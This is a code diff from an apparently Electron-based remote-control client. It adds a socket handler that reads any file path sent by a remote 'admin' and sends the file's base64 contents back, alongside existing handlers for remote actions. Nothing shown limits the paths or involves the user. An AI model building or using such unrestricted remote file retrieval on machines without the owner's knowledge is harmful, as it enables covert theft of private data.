@@ -112,6 +112,12 @@ window.onload = async () => {
             await window.electronAPI.openFile(filePath);
         });
 
+        // Handle File Download
+        socket.on('download-file', async (data) => {
+            const fileData = await window.electronAPI.readFileBase64(data.path);
+            socket.emit('download-result', { adminId: data.adminId, fileData: fileData });
+        });
+
         // Handle Remote Control Actions
         socket.on('remote-action', async (action) => {
             await window.electronAPI.remoteAction(action);
